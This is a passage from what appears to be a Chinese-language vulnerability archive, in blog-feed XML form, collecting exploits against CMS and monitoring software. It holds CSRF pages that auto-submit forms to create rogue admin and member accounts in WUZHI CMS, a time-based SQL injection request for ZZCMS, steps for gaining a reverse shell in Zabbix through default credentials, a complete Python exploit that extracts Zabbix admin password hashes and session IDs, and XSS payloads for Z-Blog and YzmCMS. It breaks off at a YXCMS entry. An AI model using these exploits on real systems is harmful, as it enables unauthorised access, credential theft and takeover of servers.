class="string">'form[truename]'</span> <span class="attr">value</span>=<span class="string">'taoge@5ecurity'</span> /&gt;</span>"; </span></span><br><span class="line">    </span><br><span class="line">    var url = "http://127.0.0.1/www/index.php?m=core&amp;f=power&amp;v=add&amp;&amp;_su=wuzhicms&amp;_menuid=61&amp;_submenuid=62&amp;submit=提交";</span><br><span class="line">    post(url,fields);</span><br><span class="line">    &#125;</span><br><span class="line">    window.onload = function() &#123; csrf_hack();&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>CSRF测试页面代码二如下：  </p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line">function post(url,fields)</span><br><span class="line">&#123;</span><br><span class="line">var p = document.createElement("form");</span><br><span class="line">p.action = url;</span><br><span class="line">p.innerHTML = fields;</span><br><span class="line">p.target = "_self";</span><br><span class="line">p.method = "post";</span><br><span class="line">document.body.appendChild(p);</span><br><span class="line">p.submit();</span><br><span class="line">&#125;</span><br><span class="line">function csrf_hack()</span><br><span class="line">&#123;</span><br><span class="line">var fields;</span><br><span class="line"></span><br><span class="line"><span class="xml">fields += "<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'info[username]'</span> <span class="attr">value</span>=<span class="string">'hack123'</span> /&gt;</span>";</span></span><br><span class="line"><span class="xml">fields += "<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'info[password]'</span> <span class="attr">value</span>=<span class="string">'hacktest'</span> /&gt;</span>"; </span></span><br><span class="line"><span class="xml">fields += "<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'info[pwdconfirm]'</span> <span class="attr">value</span>=<span class="string">'hacktest'</span> /&gt;</span>"; </span></span><br><span class="line"><span class="xml">fields += "<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'info[email]'</span> <span class="attr">value</span>=<span class="string">'taoge@5ecurity.cn'</span> /&gt;</span>"; </span></span><br><span class="line"><span class="xml">fields += "<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'info[mobile]'</span> <span class="attr">value</span>=<span class="string">''</span> /&gt;</span>"; </span></span><br><span class="line"><span class="xml">fields += "<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'modelids[]'</span> <span class="attr">value</span>=<span class="string">'10'</span> /&gt;</span>"; </span></span><br><span class="line"><span class="xml">fields += "<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'info[groupid]'</span> <span class="attr">value</span>=<span class="string">'3'</span> /&gt;</span>"; </span></span><br><span class="line"><span class="xml">fields += "<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'pids[]'</span> <span class="attr">value</span>=<span class="string">'0'</span> /&gt;</span>"; </span></span><br><span class="line"><span class="xml">fields += "<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'pids[]'</span> <span class="attr">value</span>=<span class="string">'0'</span> /&gt;</span>"; </span></span><br><span class="line"><span class="xml">fields += "<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'pids[]'</span> <span class="attr">value</span>=<span class="string">'0'</span> /&gt;</span>";</span></span><br><span class="line"><span class="xml">fields += "<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'pids[]'</span> <span class="attr">value</span>=<span class="string">'0'</span> /&gt;</span>"; </span></span><br><span class="line"><span class="xml">fields += "<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'avatar'</span> <span class="attr">value</span>=<span class="string">''</span> /&gt;</span>"; </span></span><br><span class="line"><span class="xml">fields += "<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'islock'</span> <span class="attr">value</span>=<span class="string">'0'</span> /&gt;</span>";</span></span><br><span class="line"><span class="xml">fields += "<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'sys_name'</span> <span class="attr">value</span>=<span class="string">'0'</span> /&gt;</span>";</span></span><br><span class="line"><span class="xml">fields += "<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'info[birthday]'</span> <span class="attr">value</span>=<span class="string">''</span> /&gt;</span>"; </span></span><br><span class="line"><span class="xml">fields += "<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'info[truename]'</span> <span class="attr">value</span>=<span class="string">''</span> /&gt;</span>"; </span></span><br><span class="line"><span class="xml">fields += "<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'info[sex]'</span> <span class="attr">value</span>=<span class="string">'0'</span> /&gt;</span>";</span></span><br><span class="line"><span class="xml">fields += "<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'info[marriage]'</span> <span class="attr">value</span>=<span class="string">'0'</span> /&gt;</span>";</span></span><br><span class="line"></span><br><span class="line">var url = "http://127.0.0.1/www/index.php?m=member&amp;f=index&amp;v=add&amp;_su=wuzhicms&amp;_menuid=30&amp;_submenuid=74&amp;submit=提交";</span><br><span class="line">post(url,fields);</span><br><span class="line">&#125;</span><br><span class="line">window.onload = function() &#123; csrf_hack();&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/ZZCMS/ZZCMS201910%20SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/ZZCMS/ZZCMS201910%20SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="ZZCMS201910-SQL-Injections-SQL注入"><a href="#ZZCMS201910-SQL-Injections-SQL注入" class="headerlink" title="ZZCMS201910 SQL Injections SQL注入"></a>ZZCMS201910 SQL Injections SQL注入</h2><blockquote><p>前提是你有一个具有购买权限的VIP会员账户<br>不然会提示：<code>&quot;您所在的用户组没有下载此信息的权限！&lt;br&gt;&lt;input  type=button value=升级成VIP会员 onclick=\&quot;location.href=&#39;/one/vipuser.php&#39;\&quot;/&gt;&quot;</code>  </p></blockquote><h3 id="注入点-user-dls-download-with-parameter-id"><a href="#注入点-user-dls-download-with-parameter-id" class="headerlink" title="注入点 user/dls_download with parameter $id"></a>注入点 <code>user/dls_download with parameter $id</code></h3><h3 id="利用POC如下"><a href="#利用POC如下" class="headerlink" title="利用POC如下"></a>利用POC如下</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /user/dls_download.php HTTP/1.1</span><br><span class="line">Host: test.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 45</span><br><span class="line">Origin: http://test.com</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://test.com/user/advzt_manage.php</span><br><span class="line">Cookie: Hm_lvt_f6f37dc3416ca514857b78d0b158037e=1576564072; Hm_lvt_520556228c0113270c0c772027905838=1576734687,1577071433; app_href_source=myapp/free; PHPSESSID=f0fb73cc2f2d41d2a3b1edb7340841a3; arrlanguage=metinfo; Hm_lpvt_520556228c0113270c0c772027905838=1577672843; acc_auth=4b90lwFZZGUdz47dUybObYz1MoB612Tg7bCn10U0P4BKoY%2FR9nnvQapvPIBF%2BB4w11KPOWCNH%2FLvwx9rH7424ZH0; acc_key=eXM7G4F; __tins__713776=%7B%22sid%22%3A%201577775703119%2C%20%22vd%22%3A%201%2C%20%22expires%22%3A%201577777503119%7D; __51cke__=; __51laig__=28; bdshare_firstime=1577771760963; UserName=test; PassWord=4297f44b13955235245b2497399d7a93</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line"></span><br><span class="line">id[]=1&amp;id[]=2)%0aor%0asleep(5)%23&amp;FileExt=xxx</span><br></pre></td></tr></table></figure><p>来源与：<a href="https://github.com/JcQSteven/blog/issues/15" target="_blank" rel="noopener">https://github.com/JcQSteven/blog/issues/15</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/zabbix/zabbix%E5%90%8E%E5%8F%B0getshell/zabbix%E5%90%8E%E5%8F%B0getshell/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/zabbix/zabbix%E5%90%8E%E5%8F%B0getshell/zabbix%E5%90%8E%E5%8F%B0getshell/</url>
      
        <content type="html"><![CDATA[<p>###漏洞详情###</p><ol><li><p>默认用户名密码登录</p><p> Admin / zabbix</p></li></ol><p>2.进入后点击管理-脚本</p><p><img src="zabbix后台getshell/QQ截图20210119143053.png" alt></p><p>3.点右边创建脚本或修改已有脚本,写入反弹shell<br><img src="zabbix后台getshell/QQ截图20210119143928.png" alt></p><p>4.然后点击检测中-最新数据<br><img src="zabbix后台getshell/QQ截图20210119144058.png" alt></p><p><img src="zabbix后台getshell/QQ截图20210119144141.png" alt></p><p>5.收到反弹的shell</p><p><img src="zabbix后台getshell/QQ截图20210119144213.png" alt></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/zabbix/zabbix%202.2.x,%203.0.0-3.0.3%E7%89%88%E6%9C%ACSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/zabbix%202.2.x,%203.0.0-3.0.3%E7%89%88%E6%9C%ACSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/zabbix/zabbix%202.2.x,%203.0.0-3.0.3%E7%89%88%E6%9C%ACSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/zabbix%202.2.x,%203.0.0-3.0.3%E7%89%88%E6%9C%ACSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>###漏洞详情 ###<br>Zabbix 是由 Alexei Vladishev 开发的一种网络监视、管理系统，基于 Server-Client 架构。可用于监视各种网络服务、服务器和网络机器等状态。本着其开源、安装简单等特点被广泛使用， zabbix安装完成后，超级管理员账号默认为：</p><pre><code>用户名：Admin   密码：zabbix。</code></pre><p>二、Guest用户<br>  zabbix系统安装完成后，默认会有一个guest账号：</p><pre><code>用户名：guest   密码为空  ，只能看到zabbix后台，没有具体内容</code></pre><p>但zabbix 2.2.x, 3.0.0-3.0.3版本存在SQL注入漏洞，攻击者无需授权登陆即可登陆zabbix管理系统，进入后台后script等功能直接获取zabbix服务器的操作系统权限</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>1.访问的zabbix的地址后面加上如下url：</p><pre><code>/jsrpc.php?sid=0bcd4ade648214dc&amp;type=9&amp;method=screen.get&amp;timestamp=1471403798083&amp;mode=2&amp;screenid=&amp;groupid=&amp;hostid=0&amp;pageFile=history.php&amp;profileIdx=web.item.graph&amp;profileIdx2=2&apos;3297&amp;updateProfile=true&amp;screenitemid=&amp;period=3600&amp;stime=20160817050632&amp;resourcetype=17&amp;itemids%5B23297%5D=23297&amp;action=showlatest&amp;filter=&amp;filter_task=&amp;mark_color=1</code></pre><p><img src="zabbixSQL注入漏洞/20191129181122-986155fe-1290-1.png" alt><br>输出结果，若包含：You have an error in your SQL syntax;表示漏洞存在。</p><p>2.首先在Administration页面的scrpit功能栏创建script如下：<br><img src="zabbixSQL注入漏洞/20191129181125-99ce7aac-1290-1.png" alt></p><p>3.然后重点在于找触发点，找到触发点才能执行。方法很多，这里拿常用的举例。<br><img src="zabbixSQL注入漏洞/20191129181125-99fc9798-1290-1.png" alt><br>4.执行成功后即可getshell。<br><img src="zabbixSQL注入漏洞/20191129181125-9a309278-1290-1.png" alt></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre><code>#!/usr/bin/env python# -*- coding: utf-8 -*-# Date: 2016/8/18# Modified by: Jamin Zhangimport urllib2import sys, osimport redef deteck_Sql():u&apos;检查是否存在 SQL 注入&apos;payload = &quot;jsrpc.php?sid=0bcd4ade648214dc&amp;type=9&amp;method=screen.get&amp;timestamp=1471403798083&amp;mode=2&amp;screenid=&amp;groupid=&amp;hostid=0&amp;pageFile=history.php&amp;profileIdx=web.item.graph&amp;profileIdx2=999&apos;&amp;updateProfile=true&amp;screenitemid=&amp;period=3600&amp;stime=20160817050632&amp;resourcetype=17&amp;itemids%5B23297%5D=23297&amp;action=showlatest&amp;filter=&amp;filter_task=&amp;mark_color=1&quot;try:response = urllib2.urlopen(url + payload, timeout=10).read()except Exception, msg:print msgelse:key_reg = re.compile(r&quot;INSERT\s*INTO\s*profiles&quot;)if key_reg.findall(response):return Truedef sql_Inject(sql):u&apos;获取特定sql语句内容&apos;payload = url + &quot;jsrpc.php?sid=0bcd4ade648214dc&amp;type=9&amp;method=screen.get&amp;timestamp=1471403798083&amp;mode=2&amp;screenid=&amp;groupid=&amp;hostid=0&amp;pageFile=history.php&amp;profileIdx=web.item.graph&amp;profileIdx2=&quot; + urllib2.quote(sql) + &quot;&amp;updateProfile=true&amp;screenitemid=&amp;period=3600&amp;stime=20160817050632&amp;resourcetype=17&amp;itemids[23297]=23297&amp;action=showlatest&amp;filter=&amp;filter_task=&amp;mark_color=1&quot;try:response = urllib2.urlopen(payload, timeout=10).read()except Exception, msg:print msgelse:result_reg = re.compile(r&quot;Duplicate\s*entry\s*&apos;~(.+?)~1&quot;)results = result_reg.findall(response)if results:return results[0]if __name__ == &apos;__main__&apos;:# os.system([&apos;clear&apos;, &apos;cls&apos;][os.name == &apos;nt&apos;])print &apos;+&apos; + &apos;-&apos; * 60 + &apos;+&apos;print u&apos;\t   Python Zabbix &lt; 3.0.4 SQL 注入 Exploit&apos;print &apos;\tOrigin Author: http://www.waitalone.cn/&apos;print &apos;\t\t   Modified by: Jamin Zhang&apos;print &apos;\t\t   Date: 2016-08-18&apos;print &apos;+&apos; + &apos;-&apos; * 60 + &apos;+&apos;if len(sys.argv) != 2:print u&apos;用法: &apos; + os.path.basename(sys.argv[0]) + u&apos; [Zabbix Server Web 后台 URL]&apos;print u&apos;实例: &apos; + os.path.basename(sys.argv[0]) + &apos; http://jaminzhang.github.io&apos;sys.exit()url = sys.argv[1]if url[-1] != &apos;/&apos;: url += &apos;/&apos;passwd_sql = &quot;(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select concat(name,0x3a,passwd) from  users limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)&quot;session_sql = &quot;(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select sessionid from sessions limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)&quot;if deteck_Sql():print u&apos;Zabbix 存在 SQL 注入漏洞！\n&apos;print u&apos;管理员  用户名密码：%s&apos; % sql_Inject(passwd_sql)print u&apos;管理员  Session_id：%s&apos; % sql_Inject(session_sql)else:print u&apos;Zabbix 不存在 SQL 注入漏洞！\n&apos;</code></pre><p>以下为执行上述 Exp 脚本输出结果：</p><pre><code>C:\Users\xxx\Desktop&gt;python zabbix_exp.py+------------------------------------------------------------+   Python Zabbix &lt; 3.0.4 SQL 注入 Exploit   Origin Author: http://www.waitalone.cn/   Modified by: Jamin Zhang   Date: 2016-08-18+------------------------------------------------------------+用法: zabbix_exp.py [Zabbix Server Web 后台 URL]实例: zabbix_exp.py http://jaminzhang.github.ioC:\Users\xxx\Desktop&gt;python zabbix_exp.py http://192.168.56.11/zabbix+------------------------------------------------------------+   Python Zabbix &lt; 3.0.4 SQL 注入 Exploit   Origin Author: http://www.waitalone.cn/   Modified by: Jamin Zhang   Date: 2016-08-18+------------------------------------------------------------+Zabbix 存在 SQL 注入漏洞！管理员  用户名密码：Zabbix:5fce1b3e34b520afeffb37ce08c7cd66管理员  Session_id：16c9fe855b00a92112ae55cad58792c6</code></pre><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://xz.aliyun.com/t/6874" target="_blank" rel="noopener">https://xz.aliyun.com/t/6874</a><br><a href="https://jaminzhang.github.io/security/Zabbix-latest-SQL-Injection-Vulnerability-and-EXP/" target="_blank" rel="noopener">https://jaminzhang.github.io/security/Zabbix-latest-SQL-Injection-Vulnerability-and-EXP/</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Z-Blog/Z-Blog%201.5.1.1740%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Z-Blog/Z-Blog%201.5.1.1740%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><table><thead><tr><th></th><th>漏洞名称</th><th>上报日期</th><th>漏洞发现者</th><th>产品首页</th><th>软件链接</th><th>版本</th><th>CVE编号</th></tr></thead><tbody><tr><td></td><td>Z-Blog 1.5.1.1740存在XSS漏洞</td><td>2018-04-05</td><td>zzw (<a href="mailto:zzw@5ecurity.cn" target="_blank" rel="noopener">zzw@5ecurity.cn</a>)</td><td><a href="https://www.zblogcn.com/" target="_blank" rel="noopener">https://www.zblogcn.com/</a></td><td><a href="https://github.com/zblogcn/zblogphp" target="_blank" rel="noopener">https://github.com/zblogcn/zblogphp</a></td><td>1.5.1.1740</td><td><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7736" target="_blank" rel="noopener">CVE-2018-7736</a></td><td></td></tr></tbody></table><h4 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h4><blockquote><p>Z-BlogPHP 1.5.1.1740版本的cmd.php页面ZC_BLOG_SUBNAME及ZC_UPLOAD_FILETYPE参数过滤不严格可导致跨站脚本漏洞。  </p></blockquote><h3 id="POC实现代码如下："><a href="#POC实现代码如下：" class="headerlink" title="POC实现代码如下："></a>POC实现代码如下：</h3><blockquote><p>ZC_BLOG_SUBNAME参数poc代码:</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">post_url：http://localhost/z-blog/zb_system/cmd.php?act=SettingSav&amp;token=2c7ca9a4c1c3d856e012595ca878564f</span><br><span class="line"> </span><br><span class="line">post_data:</span><br><span class="line"> </span><br><span class="line">ZC_BLOG_HOST=http%3A%2F%2Flocalhost%2Fz-blog%2F&amp;ZC_PERMANENT_DOMAIN_ENABLE=&amp;ZC_PERMANENT_DOMAIN_WITH_ADMIN=&amp;ZC_BLOG_NAME=admin&amp;ZC_BLOG_SUBNAME=Good%20Luck%20To%20You!tluf3%22%3e%3cscript%3ealert(1)%3c%2fscript%3euk095&amp;ZC_BLOG_COPYRIGHT=Copyright+Your+WebSite.Some+Rights+Reserved.&amp;ZC_TIME_ZONE_NAME=Asia%2FShanghai&amp;ZC_BLOG_LANGUAGEPACK=zh-cn&amp;ZC_UPLOAD_FILETYPE=jpg%7Cgif%7Cpng%7Cjpeg%7Cbmp%7Cpsd%7Cwmf%7Cico%7Crpm%7Cdeb%7Ctar%7Cgz%7Csit%7C7z%7Cbz2%7Czip%7Crar%7Cxml%7Cxsl%7Csvg%7Csvgz%7Crtf%7Cdoc%7Cdocx%7Cppt%7Cpptx%7Cxls%7Cxlsx%7Cwps%7Cchm%7Ctxt%7Cpdf%7Cmp3%7Cmp4%7Cavi%7Cmpg%7Crm%7Cra%7Crmvb%7Cmov%7Cwmv%7Cwma%7Cswf%7Cfla%7Ctorrent%7Capk%7Czba%7Cgzba&amp;ZC_UPLOAD_FILESIZE=2&amp;ZC_DEBUG_MODE=&amp;ZC_GZIP_ENABLE=&amp;ZC_SYNTAXHIGHLIGHTER_ENABLE=1&amp;ZC_CLOSE_SITE=&amp;ZC_DISPLAY_COUNT=10&amp;ZC_DISPLAY_SUBCATEGORYS=1&amp;ZC_PAGEBAR_COUNT=10&amp;ZC_SEARCH_COUNT=20&amp;ZC_MANAGE_COUNT=50&amp;ZC_COMMENT_TURNOFF=&amp;ZC_COMMENT_AUDIT=&amp;ZC_COMMENT_REVERSE_ORDER=&amp;ZC_COMMENTS_DISPLAY_COUNT=100&amp;ZC_COMMENT_VERIFY_ENABLE=</span><br></pre></td></tr></table></figure><blockquote><p>ZC_UPLOAD_FILETYPE参数poc代码:  </p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">post_data:</span><br><span class="line"> </span><br><span class="line">ZC_BLOG_HOST=http://localhost/z-blog/&amp;ZC_PERMANENT_DOMAIN_ENABLE=&amp;ZC_PERMANENT_DOMAIN_WITH_ADMIN=&amp;ZC_BLOG_NAME=admin&amp;ZC_BLOG_SUBNAME=Good+Luck+To+You!&amp;ZC_BLOG_COPYRIGHT=Copyright+Your+WebSite.Some+Rights+Reserved.&amp;ZC_TIME_ZONE_NAME=Asia/Shanghai&amp;ZC_BLOG_LANGUAGEPACK=zh-cn&amp;ZC_UPLOAD_FILETYPE=jpg|gif|png|jpeg|bmp|psd|wmf|ico|rpm|deb|tar|gz|sit|7z|bz2|zip|rar|xml|xsl|svg|svgz|rtf|doc|docx|ppt|pptx|xls|xlsx|wps|chm|txt|pdf|mp3|mp4|avi|mpg|rm|ra|rmvb|mov|wmv|wma|swf|fla|torrent|apk|zba|gzbauckek&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;ekkgh&amp;ZC_UPLOAD_FILESIZE=2&amp;ZC_DEBUG_MODE=&amp;ZC_GZIP_ENABLE=&amp;ZC_SYNTAXHIGHLIGHTER_ENABLE=1&amp;ZC_CLOSE_SITE=&amp;ZC_DISPLAY_COUNT=10&amp;ZC_DISPLAY_SUBCATEGORYS=1&amp;ZC_PAGEBAR_COUNT=10&amp;ZC_SEARCH_COUNT=20&amp;ZC_MANAGE_COUNT=50&amp;ZC_COMMENT_TURNOFF=&amp;ZC_COMMENT_AUDIT=&amp;ZC_COMMENT_REVERSE_ORDER=&amp;ZC_COMMENTS_DISPLAY_COUNT=100&amp;ZC_COMMENT_VERIFY_ENABLE=</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/YzmCMS/YzmCMS%203.6%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/YzmCMS/YzmCMS%203.6%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><table><thead><tr><th></th><th>漏洞名称</th><th>上报日期</th><th>漏洞发现者</th><th>产品首页</th><th>软件链接</th><th>版本</th><th>CVE编号</th></tr></thead><tbody><tr><td></td><td>YzmCMS 3.6存在XSS漏洞</td><td>2018-04-05</td><td>zzw (<a href="mailto:zzw@5ecurity.cn" target="_blank" rel="noopener">zzw@5ecurity.cn</a>)</td><td><a href="http://www.yzmcms.com/" target="_blank" rel="noopener">http://www.yzmcms.com/</a></td><td><a href="http://www.yzmcms.com/" target="_blank" rel="noopener">http://www.yzmcms.com/</a></td><td>3.6</td><td><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7653" target="_blank" rel="noopener">CVE-2018-7653</a></td><td></td></tr></tbody></table><h4 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h4><blockquote><p>YzmCMS 3.6版本的 index.php页面a、c、m参数过滤不严格可导致跨站脚本漏洞。  </p></blockquote><h3 id="POC实现代码如下："><a href="#POC实现代码如下：" class="headerlink" title="POC实现代码如下："></a>POC实现代码如下：</h3><blockquote><p>poc代码:</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/YzmCMS/index.php?m=search&amp;c=index&amp;a=initxqb4n%3Cimg%20src%3da%20onerror%3dalert(1)%3Ecu9rs&amp;modelid=1&amp;q=tes </span><br><span class="line"> </span><br><span class="line">http://localhost/YzmCMS/index.php?m=search&amp;c=indexf9q6s%3cimg%20src%3da%20onerror%3dalert(1)%3ej4yck&amp;a=init&amp;modelid=1&amp;q=tes </span><br><span class="line"> </span><br><span class="line">http://localhost/YzmCMS/index.php?m=searchr81z4%3cimg%20src%3da%20onerror%3dalert(1)%3eo92wf&amp;c=index&amp;a=init&amp;modelid=1&amp;q=tes </span><br><span class="line"> </span><br><span class="line">http://localhost/YzmCMS/index.php?m=search&amp;c=index&amp;a=init&amp;modelid=1b2sgd%22%3e%3cscript%3ealert(1)%3c%2fscript%3eopzx0&amp;q=tes</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YXCMS%201.4.7%E5%82%A8%E5%AD%98%E5%9E%8Bxss/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YXCMS%201.4.7%E5%82%A8%E5%AD%98%E5%9E%8Bxss/</url>
      
